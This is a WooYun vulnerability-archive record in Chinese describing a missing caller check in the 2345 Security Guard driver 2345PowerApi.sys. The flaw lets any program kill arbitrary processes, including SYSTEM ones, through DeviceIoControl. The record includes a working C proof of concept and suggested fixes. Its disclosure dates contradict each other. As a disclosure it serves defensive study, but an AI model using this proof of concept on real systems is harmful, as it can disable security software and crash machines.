{"id": 80200, "wybug_id": "wooyun-2015-0156416", "wybug_title": "2345安全卫士某驱动漏洞导致内核API可被任意调用", "wybug_corp": "2345网址导航", "wybug_author": "路人甲", "wybug_date": "2015-11-27 18:53", "wybug_open_date": "2015-01-26 10:54", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "驱动安全问题"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-02：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向公众公开  简要描述： 2345安全卫士的一个驱动对调用者的认证不严，导致任意应用层程序均可以利用该驱动来调用内核API，实现越权操作。 详细说明：  1.存在漏洞的驱动：2345PowerApi.sys 版本：**.**.**.**2.漏洞成因：该驱动对Ring3提供了内核杀进程的接口，Ring3通过DeviceIoContol传递0x228000控制码实现调用。但该驱动对调用者未做合法性检查，导致任意程序都可以使用这个接口，用来杀死任意进程，包括杀死system权限的进程。3.描述：windows 7专业版，开启UAC\n\n2345service.exe的Integrity level是system\n\n攻击程序的Integrity level是Medium\n\n漏洞触发后，可以成功杀死2345service.exe如果把传给驱动的进程pid修改为smss.exe，则系统会蓝屏崩溃。   漏洞证明：  \nvoid Fuzz2(HANDLE hDev){\tDWORD dwReturned = 0;\tchar input[4096] = { 0 };\t\t*((DWORD*)input) = 300;//1252; // 要kill的进程pid\tDeviceIoControl(hDev,\t\t0x228000,\t\t(LPVOID)input,\t\t4,\t\tNULL,\t\t0,\t\t&dwReturned,\t\tNULL);}void Fuzz1(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\2345PowerApi\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ|GENERIC_WRITE,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif(INVALID_HANDLE_VALUE != hDev)\t{\t\tOutputDebugStringA(\"Open Device OK!!!!\\n\");\t\tFuzz2(hDev);\t\tCloseHandle(hDev);\t}}int _tmain(int argc, _TCHAR* argv[]){\tprintf(\"Kill 2345\\n\");\tFuzz1();\treturn 0;}\n   修复方案：  1.增加对驱动调用者的合法性验证；2.对被杀的进程做白名单排除；   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-26 10:54 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}